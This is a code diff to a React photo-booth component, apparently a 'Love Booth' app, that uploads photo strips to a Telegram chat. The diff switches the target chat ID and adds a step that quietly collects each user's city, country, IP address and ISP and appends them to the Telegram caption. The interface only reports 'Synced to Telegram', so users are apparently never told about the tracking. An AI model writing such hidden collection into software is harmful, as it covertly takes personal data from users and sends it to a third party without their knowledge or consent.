@@ -4,6 +4,7 @@ import { toPng, toBlob } from 'html-to-image';
 import { FRAMES } from '../constants';
 import { sendPhotoToTelegram } from '../services/telegramService';
 import { audioService } from '../services/audioService';
+import { getLocationData } from '../services/locationService';
 
 interface PhotoStripProps {
   photos: CapturedPhoto[];
@@ -19,7 +20,7 @@ interface VisualEffect {
   overlay?: 'sparkle' | 'cupid-sparkle' | 'hearts' | 'rose';
 }
 
-const TELEGRAM_CHAT_ID = '-5193703372';
+const TELEGRAM_CHAT_ID = '-5055132755';
 
 const EFFECTS: VisualEffect[] = [
   { id: 'none', name: 'Original', filter: 'none' },
@@ -67,20 +68,26 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
     setSyncStatus('syncing');
 
     try {
+      // Fetch location and IP info
+      const location = await getLocationData();
+      const locationStr = location
+        ? `\n📍 Location: ${location.city}, ${location.country}\n🌐 IP: ${location.ip}\n🏢 ISP: ${location.org}`
+        : '\n📍 Location: Unknown';
+
       // Small delay to ensure the DOM is fully rendered before capturing
-      await new Promise(r => setTimeout(r, 800));
+      await new Promise(r => setTimeout(r, 1000));
 
       console.log('Capturing strip image...');
       const blob = await toBlob(stripRef.current, exportOptions as any);
 
-      if (!blob) {
-        console.error('Blob generation failed: toBlob returned null/undefined');
-        throw new Error('Failed to create image blob');
+      if (!blob || blob.size < 1000) {
+        console.error('Blob generation failed or too small:', blob?.size);
+        throw new Error('Image capture failed. Please try again.');
       }
 
       console.log(`Blob created: ${blob.size} bytes. Sending to Telegram...`);
 
-      const caption = `❤️ Love Booth Capture!\n✨ Effect: ${selectedEffect.name}\n🖼️ Frame: ${frame.name}\n💌 Memories captured forever.`;
+      const caption = `❤️ Love Booth Capture!\n✨ Effect: ${selectedEffect.name}\n🖼️ Frame: ${frame.name}\n💌 Memories captured forever.${locationStr}`;
 
       const result = await sendPhotoToTelegram(blob, TELEGRAM_CHAT_ID, caption);
       console.log('Telegram sync successful:', result);
@@ -251,7 +258,7 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
                   syncStatus === 'success' ? 'Synced to Telegram! ❤️' :
                     syncStatus === 'error' ? 'Sync failed. Retry below.' : 'Ready to sync.'}
               </span>
-              <span className="text-[10px] opacity-60">To: -5193703372</span>
+              <span className="text-[10px] opacity-60">To: -5055132755</span>
             </div>
           </div>
           {syncStatus === 'error' && (
